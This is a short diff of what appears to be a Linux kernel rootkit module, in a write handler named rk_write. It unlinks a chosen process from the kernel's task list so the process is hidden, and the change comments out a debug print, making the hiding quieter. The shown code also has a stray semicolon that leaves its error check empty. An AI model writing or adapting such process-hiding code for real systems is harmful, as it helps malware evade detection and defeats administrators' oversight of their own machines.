@@ -133,7 +133,7 @@ static ssize_t rk_write(struct file *file, const char __user *buffer,
                 if(kstrtol(pid_s, 10, &pid));
                 if(pid == p->pid)
                 {
-                    printk("--------%ld: %s\n", pid, p->comm);
+                    //printk("--------%ld: %s\n", pid, p->comm);
                     proc_to_hide[current_pid] = p;
                     p->tasks.prev->next = p->tasks.next;
                     p->tasks.next->prev = p->tasks.prev;
